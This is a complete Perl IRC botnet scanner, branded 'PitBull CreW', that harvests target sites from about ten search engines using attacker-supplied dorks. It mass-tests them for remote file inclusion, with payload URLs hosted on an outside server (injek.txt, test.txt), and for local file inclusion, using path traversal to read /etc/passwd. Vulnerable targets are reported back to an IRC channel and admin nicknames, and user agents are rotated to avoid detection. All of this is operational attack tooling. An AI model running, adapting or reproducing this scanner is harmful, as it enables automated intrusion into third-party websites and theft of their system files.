#!/usr/bin/perl
#

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket::INET;

#################
#[Configuration]#
#################
my $response = "http://usb99.fileave.com/response.txt"; # included in zip as response.txt
my $test = "http://usb99.fileave.com/test.txt?"; # included in zip as test.txt
my $printcmd = "http://usb99.fileave.com/injek.txt?";
my $responselfi = "/../../../../../../../../etc/passwd";
my $printcmdlfi = "/../../../../../../../../etc/passwd";
my $nickname = "oishi[".int(rand(100))."]",
my $ident = "oishi";
my $admin = "sherif";
my $adm = "sherif";
my $channel = "#shetha";
my $server = "irc.planetwork.server.or.id";
my $port = 6667;
#################
#[Configuration]#
#################

my $sock;
my $exploitcounter = 100;
my @User_Agent = &Agent();
my $pid = fork();
if($pid==0){
	&connectirc($nickname,$ident,$channel,$server,$port);
}else{
	exit(0);
}

sub connectirc(){
	my($nickname,$ident,$channel,$server,$port)=@_;
	$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server",PeerPort=>$port);
	$sock->autoflush(1);
	print $sock "NICK ".$nickname."\r\n";
	print $sock "USER ".$ident." 8 *  : PitBull CreW\r\n";
	print $sock "JOIN ".$channel."\r\n";
	while( $command = <$sock> ){

	
	

if($command =~ /\!a\s+(.*?)\s+(.*)/){
	if(fork() == 0){
		my($bug,$dork)=($1,$2);
		&scan($bug,$dork);
			exit(0);
	}
}
		
		
if($command =~ /\!oishi\s+(.*?)\s+(.*)/){
	if(fork() == 0){
		my($bug,$dork)=($1,$2);
		&autoscan($bug,$dork);
			exit(0);
	}
}

if($command =~ /\!autorfipaths\s+(.*)/){
	if(fork() == 0){
		my($dork)=($1);
		&autopath($dork);
			exit(0);
	}
}

if($command =~ /\!lfis\s+(.*?)\s+(.*)/){
	if(fork() == 0){
		my($bug,$dork)=($1,$2);
		&lfi($bug,$dork);
			exit(0);
	}
}


if($command =~ /\!infos/){
	&message($channel,"4[i] 12Public Scanner from  -> 2 PitBull CreW ");
	&message($channel,"4[i] 12Use for each command  -> 2 !");
	&message($channel,"4[i] 12Commands -> 2 scan string dork ");
	&message($channel,"4[i] 12Commands -> 2 rfi string dork ");
	&message($channel,"4[i] 12Commands -> 2 autorfipath inject ");
	&message($channel,"4[i] 12Commands -> 2 lfi string dork ");
}

if($command =~ /\!bijiquz/){
	&message($channel, "QUIT");
  $killd = "kill -9 ".fork;
  system (`$killd`);
}


if($command =~ /\!ucitotz/){
	&message($channel, "QUIT");
	exit(0);
}


if($command =~ /^PING \:(.*)/){
	print $sock "PONG :$1";
}
}
}


sub scan(){
	my($bug,$dork)=@_;
	$dork =~ s/[\r\n]//g;
	my $counter = 0;
	&message($channel,"4[+] 12Scanner Started for -> 2".$dork);
	&Find($dork);
	&Test($bug);
	&message($channel,"4[+] 12Scanner Finished for -> 2".$dork);
}

sub lfi(){
	my($bug,$dork)=@_;
	$dork =~ s/[\r\n]//g;
	my $counter = 0;
	&message($channel,"4[+] 12LFI Scanner Started for -> 2".$dork);
	&Find($dork);
	&Testlfi($bug);
	&message($channel,"4[+] 12Scanner Finished for -> 2".$dork);
}

sub autoscan(){
	my @domini = &SiteDomains();
	my($bug,$dork)=@_;
	$dork =~ s/[\r\n]//g;
	&message($channel,"4[+] 12Auto-Dork-Scanner Started for -> 2".$dork);
	if($dork =~ /site:/){
		&message($channel,"4[-] 12There was a error while starting the AutoScan");
		exit(0);
	}
	foreach my $Domains(@domini){
		my $auto_dork = $dork."+site:".$Domains;
		&message($channel,"4[+] 12Adding AutoDork ->".$auto_dork);
		&Find($auto_dork);
		&Test($bug);
	&message($channel,"4[+] 12Scanner Finished for -> 2".$dork);
	}
}


sub autopath(){
	my @path = &Paths();
	my($dork)=@_;
	$dork =~ s/[\r\n]//g;
	&message($channel,"4[+] 12Auto-Path-Scanner Started for -> 2".$dork);
	if($dork =~ /index/){
		&message($channel,"4[-] 12There was a error while starting the AutoPath scan");
		exit(0);
	}
	foreach my $pathi(@path){
		my $auto_path = $pathi.$dork;
	&message($channel,"4[+] 12Adding AutoPath -> 2 ".$auto_path);
		&Find($auto_path);
		&Test($auto_path);
	&message($channel,"4[+] 12Scanner Finished for -> 2".auto_path);
	}
}

sub Test(){
	my $counter = 0;
	my $bug = $_[0];
	my @links = &GetLink();
	my @forks;
	my $forked++;
	&message($channel,"4[+] 12Total Sites ->2 ".scalar(@links));
	my @uni = &Unique(@links);
	&message($channel,"4[+] 12Cleaned Sites ->2 ".scalar(@uni));
	&Remove();
	my $testx = scalar(@uni);
	my $startx = 0;
	foreach my $site (@uni){
		$counter++;
		my $link = "http://".$site.$bug.$test."?";
		my $responser = "http://".$site.$bug.$response."?";
#		print($link."\n"); # Prints test links in terminal
		if($counter %$exploitcounter == 0){
			my $start = 0;
			foreach my $f(@forks){
				waitpid($f,0);
				$forks[$start--];
				$start++;
			}
			$startx = 0;
		}
		$forks[$startx]=fork();
		if($forks[$startx] == 0){
			my $htmlsite = &Query($link,"3");
			if($htmlsite =~ /SafemodeOFF/){
				my $responsing = &Query($responser,"3");
					if($responsing =~ /SafeOFF/){
				&message($channel,"4[!] 12Vuln Founded with SafeMode 3OFF12 ->2 "."http://".$site.$bug.$printcmd);
				&message($admin,"4[!] 12Vuln Founded with SafeMode 3OFF12 ->2 "."http://".$site.$bug.$printcmd);
				&message($adm,"4[!] 12Vuln Founded with SafeMode 3OFF12 ->2 "."http://".$site.$bug.$printcmd);
			}}
			elsif($htmlsite =~ /SafemodeON/){
				&message($channel,"4[!] 12Vuln Founded with SafeMode 4ON12 ->2 "."http://".$site.$bug.$printcmd);
				&message($admin,"4[!] 12Vuln Founded with SafeMode 4ON12 ->2 "."http://".$site.$bug.$printcmd);
				&message($adm,"4[!] 12Vuln Founded with SafeMode 4ON12 ->2 "."http://".$site.$bug.$printcmd);
			}
			exit(0);
		}
		if($counter %150 == 0){
			&message($channel,"4[*] 12Exploiting ->2 ".$counter." out of ".$testx);
		}
		$startx++;
	}
	my $start = 0;
	foreach my $f(@forks){
		waitpid($f,0);
		$forks[$start--];
		$start++;
	}
}

sub Testlfi(){
	my $counter = 0;
	my $bug = $_[0];
	my @links = &GetLink();
	my @forks;
	my $forked++;
	&message($channel,"4[+] 12Total Sites ->2 ".scalar(@links));
	my @uni = &Unique(@links);
	&message($channel,"4[+] 12Cleaned Sites ->2 ".scalar(@uni));
	&Remove();
	my $testx = scalar(@uni);
	my $startx = 0;
	foreach my $site (@uni){
		$counter++;
		my $link = "http://".$site.$bug.$responselfi;
		print($link."\n"); # Prints test links in terminal
		if($counter %$exploitcounter == 0){
			my $start = 0;
			foreach my $f(@forks){
				waitpid($f,0);
				$forks[$start--];
				$start++;
			}
			$startx = 0;
		}
		$forks[$startx]=fork();
		if($forks[$startx] == 0){
			my $htmlsite = &Query($link,"3");
			if($htmlsite =~ /root:x:/){
				&message($channel,"4[!] 12LFI ->2 "."http://".$site.$bug.$printcmdlfi);
			}
			exit(0);
		}
		if($counter %150 == 0){
			&message($channel,"4[*] 12Exploiting ->2 ".$counter." out of ".$testx);
		}
		$startx++;
	}
	my $start = 0;
	foreach my $f(@forks){
		waitpid($f,0);
		$forks[$start--];
		$start++;
	}
}

sub Find(){
	my $dork = $_[0];
	my @proc;
	$proc[0] = fork();
	if($proc[0] == 0){
		&message($channel,"4[*] 12Google ->2 ".scalar(&Google($dork)));
		exit;
	}
	$proc[1] = fork();
	if($proc[1] == 0){
		&message($channel,"4[*] 12Yahoo ->2 ".scalar(&Yahoo($dork)));
		exit;
	}
	$proc[2] = fork();
	if($proc[2] == 0){
		&message($channel,"4[*] 12Abacho ->2 ".scalar(&Abacho($dork)));
		exit;
	}
	$proc[3] = fork();
	if($proc[3] == 0){
		&message($channel,"4[*] 12GigaBlast ->2 ".scalar(&Gigablast($dork)));
		exit;
	}
	$proc[4] = fork();
	if($proc[4] == 0){
		&message($channel,"4[*] 12MSN ->2 ".scalar(&MSN($dork)));
		exit;
	}
	$proc[5] = fork();
	if($proc[5] == 0){
		&message($channel,"4[*] 12AOL ->2 ".scalar(&Aol($dork)));
		exit;
	}
	$proc[6] = fork();
	if($proc[6] == 0){
		&message($channel,"4[*] 12Seekport ->2 ".scalar(&Seekport($dork)));
		exit;
	}
	$proc[7] = fork();
	if($proc[7] == 0){
		&message($channel,"4[*] 12AllTheWeb ->2 ".scalar(&Alltheweb($dork)));
		exit;
	}
	$proc[8] = fork();
	if($proc[8] == 0){
		&message($channel,"4[*] 12Virgilio ->2 ".scalar(&Virgilio($dork)));
		exit;
	}
	$proc[9] = fork();
	if($proc[9] == 0){
		&message($channel,"4[*] 12UOL ->2 ".scalar(&UOL($dork)));
		exit;
	}

	waitpid($proc[0],0);
	waitpid($proc[1],0);
	waitpid($proc[2],0);
	waitpid($proc[3],0);
	waitpid($proc[4],0);
	waitpid($proc[5],0);
	waitpid($proc[6],0);
	waitpid($proc[7],0);
	waitpid($proc[8],0);
	waitpid($proc[9],0);
}

sub message(){
	my ($who,$what)=@_;
	print $sock "PRIVMSG ".$who." :".$what."\r\n";
}

sub Google(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my @dom = &GoogleDomains();
	my $file = "google.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		my $Domains = $dom[rand(scalar(@dom))];
		$html.=&Query("http://www.google.com/search?q=".$dork."&hl=en&start=".$num."&sa=N".$start);
	}
	while($html =~ m/<h2 class=r><a href=\"http:\/\/(.+?)\"\ class/g){
		$1 =~ /google/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Yahoo(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "yahoo.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://search.yahooapis.com/WebSearchService/V1/webSearch?appid=SiteSearch&query=".$dork."&results=".$num."&start=".$start);
	}
	while($html =~ m/<Url>http:\/\/(.+?)\<\/Url>/g){
		$1 =~ /yahoo/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Abacho(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=10;
	my $max=10*10;
	my $file = "abacho.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://search.lycos.com/?query=".$dork."&page2=".$start."&tab=web");
	}
	while($html =~ m/ target=\"_blank\">http:\/\/([^>\"]*)\//g){
		if($1 !~ /abacho/){
			push(@result,&Links($1,$file));
		}
	}
	return(@result);
}

sub Gigablast(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $max=1000*100;
	my $file = "gigablast.txt";
	my $html;
	my @result;
	$html.=&Query("http://www.gigablast.com/search?q=".$dork."&n=".$max);
	while($html =~ m/<span class=\"url\">(.+?)\<\/span>/g){
		push(@result,&Links($1,$file));
	}
	return(@result);
}

sub MSN(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=1000*10;
	my $file = "msn.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://search.live.com/results.aspx?q=".$dork."&first=".$start."&FORM=PORE");
	}
	while($html =~ m/a href=\"http:\/\/(.+?)\" class/g){
		$1 =~ /msn|live/ || push(@result,&Links($1,$file));
	}
	return(@result);
}


sub Virgilio(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=10;
	my $max=100*10;
	my $file = "virgilio.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		 $html.=&Query("http://ricerca.alice.it/ricerca?qs=".$dork."&filter=1&site=&lr=&hits=10&offset=".$start/$num);
	}
	while($html =~ m/\"><a href=\"?http:\/\/(.+?)\" class=/g ){
		$1 =~ /google/ || push(@result,&Links($3,$file));
	}
	return(@result);
}


sub Seekport(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "seekport.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://suche.fireball.de/cgi-bin/pursuit?pag=".$start."&query=".$dork."&cat=fb_web&enc=utf-8");
	}
	while($html =~ m/<a href=\"?http:\/\/(.+?)\">/g ){
		$1 =~ /seekport|infospace/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Alltheweb(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "alltheweb.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://www.alltheweb.com/search?advanced=1&cat=web&type=all&hits=".$num."&ocjp=1&q=".$dork."&o=".$start);
	}
	while($html =~ m/<span class=\"resURL\">http:\/\/(.+?)\ /g){
		$1 =~ /alltheweb/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Aol(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=20;
	my $max=100*10;
	my $file = "aol.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://it.ask.com/web?q=".$dork."&qsrc=1&o=312&l=dir&dm=all");
	}
	while($html =~ m/<span class=\"resURL\">http:\/\/(.+?)\ /g){
		$1 =~ /aol/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub UOL(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=20;
	my $max=100*10;
	my $file = "UOL.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://busca.uol.com.br/www/index.html?q=".$dork."&start=".$start);
	}
	while($html =~ m/<a href=\"http:\/\/([^>\"]*)/g){
		$1 =~ /busca|uol|yahoo/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub AltaVista(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=20;
	my $max=1000*10;
	my $file = "AltaVista.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://www.altavista.com/web/results?itag=ody&q=".$dork."&kgs=0&kls=0&nbq=100&stq=".$start);
	}
	while($html =~ m/<span class=ngrn>(.+?)\//g){
		$1 =~ /altavista/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Query(){
	my($link,$timeout)=@_;
	my $req=HTTP::Request->new(GET=>$link);
	my $ua=LWP::UserAgent->new();
	$ua->agent($User_Agent[rand(scalar(@User_Agent))]);
	$ua->timeout($timeout);
	my $response=$ua->request($req);
	return $response->content;
}

sub Key(){
	my $key=$_[0];
	$key =~ s/ /\+/g;
	$key =~ s/:/\%3A/g;
	$key =~ s/\//\%2F/g;
	$key =~ s/&/\%26/g;
	$key =~ s/\"/\%22/g;
	$key =~ s/\\/\%5C/g;
	$key =~ s/,/\%2C/g;
	return $key;
}

sub GetLink(){
	my @file = ("google.txt","yahoo.txt","abacho.txt","gigablast.txt","msn.txt","virgilio.txt","seekport.txt","alltheweb.txt","aol.txt","UOL.txt");
	my $link;
	my @total;
	foreach my $n (@file){
		open(F,'<',$n);
		while($link = <F>){
			$link=~s/[\r\n]//g;
			push(@total,$link);
		}
		close(F);
	}
	return(@total);
}

sub Remove(){
	my @file = ("google.txt","yahoo.txt","abacho.txt","gigablast.txt","msn.txt","virgilio.txt","seekport.txt","alltheweb.txt","aol.txt","UOL.txt");
	foreach my $n (@file){
		system("rm -rf ".$n);
	}
}

sub Links(){
	my ($link,$file_print) = @_;
	$link=~s/http:\/\///g;
	my $host = $link;
	my $host_dir = $host;
	my @links;
	$host_dir=~s/(.*)\/[^\/]*$/\1/;
	$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$host_dir=&End($host_dir);
	$host=&End($host);
	$link=&End($host);
	push(@links,$link,$host,$host_dir);
	open($file,'>>',$file_print);
	print $file "$link\n$host_dir\n$host\n";
	close($file);
	return @links;
}

sub End(){
	$string=$_[0];
	$string.="/";
	$string=~s/\/\//\//;
	while($string=~/\/\//){
		$string=~s/\/\//\//;
	}
	return($string);
}

sub Unique{
	my @Unique = ();
	my %seen = ();
	foreach my $element ( @_ ){
		next if $seen{ $element }++;
		push @Unique, $element;
	}
	return @Unique;
}

sub Agent(){
	my @ret = (
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Microsoft Pocket Internet Explorer/0.6",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
	"MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
	"Advanced Browser (http://www.avantbrowser.com)",
	"Avant Browser (http://www.avantbrowser.com)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
	"Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
	"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
	"Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
	"Mozilla/3.0 (OS/2; U)",
	"Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
	"Mozilla/4.61 (Macintosh; I; PPC)",
	"Mozilla/4.61 [en] (OS/2; U)",
	"Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
	"Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}

sub GoogleDomains(){
	my @ret = (
			"ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
			"ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
			"com.tr","com.tw","com.ua","co.uk","hu"
		  );
	return(@ret);
}

sub SiteDomains(){
	my @dom = (
			"com","net","org","info","us","br","it","fr","nl","gr","th","au","tv","ar","be","ca","ch","co","de","dk","es","fi","hk","id",
			"no","il","ir","jp","kr","my","pe","pl","pt","ru","ro","sg","tr","tw","uk","hu","ph"
		  );
} 

sub Paths(){
	my @path = (
			"index.php?","index2.php?","index3.php?","home.php?","menu.php?","file.php?","config.php?","contact.php?","about.php?","template.php?","main.php?"
		  );
} 

#sub sitebypass(){
#	my $dork=@_;
#	$dork=&Key($dork);
#	my @site=(
#			"at","be","ca","de","fr",
#			"it","nl","pl","ru","mx","edu"
#			);
#			
#	my @pids;
#	my $i=0;
#		foreach my $sites(@site)
#	{
#		$pids[$i]=fork();
#			if($pids[$i]==0)
#				{
#				my $engine=&engine($dork,$sites);
#					exit(0);
#			}
#					$i++;
#		}
#						for($i=0;$b<=$i;$b++){
#						waitpid($pids[$b],0);
#	}
#push(@result, $engine );
#return(@result)
#}
